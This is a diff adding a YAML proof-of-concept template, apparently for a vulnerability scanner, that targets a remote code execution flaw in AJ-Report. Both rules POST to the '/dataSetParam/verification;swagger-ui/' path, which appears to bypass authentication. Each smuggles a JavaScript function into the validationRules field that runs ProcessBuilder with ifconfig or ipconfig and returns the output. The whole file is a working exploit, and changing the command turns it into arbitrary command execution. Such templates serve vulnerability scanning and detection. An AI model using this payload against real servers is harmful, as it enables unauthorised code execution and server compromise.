@@ -1,0 +1,28 @@
+name: poc-yaml-AJ-Report-verification_swagger-ui-RCE
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /dataSetParam/verification;swagger-ui/
+      headers:
+        Content-Type: application/json;charset=UTF-8
+      body: "{\"ParamName\":\"\",\"paramDesc\":\"\",\"paramType\":\"\",\"sampleItem\":\"1\",\"mandatory\":true,\"requiredFlag\":1,\"validationRules\":\"function verification(data){a = new java.lang.ProcessBuilder(\\\"ifconfig\\\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}\"}"
+    expression: response.status == 200 && response.body.bcontains(b'eth0:')
+  r1:
+    request:
+      method: POST
+      path: /dataSetParam/verification;swagger-ui/
+      headers:
+        Content-Type: application/json;charset=UTF-8
+      body: "{\"ParamName\":\"\",\"paramDesc\":\"\",\"paramType\":\"\",\"sampleItem\":\"1\",\"mandatory\":true,\"requiredFlag\":1,\"validationRules\":\"function verification(data){a = new java.lang.ProcessBuilder(\\\"ipconfig\\\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}\"}"
+    expression: response.status == 200 && response.body.bcontains(b'Windows IP')
+
+expression: r0() || r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://superhero.blog.csdn.net/article/details/139902252
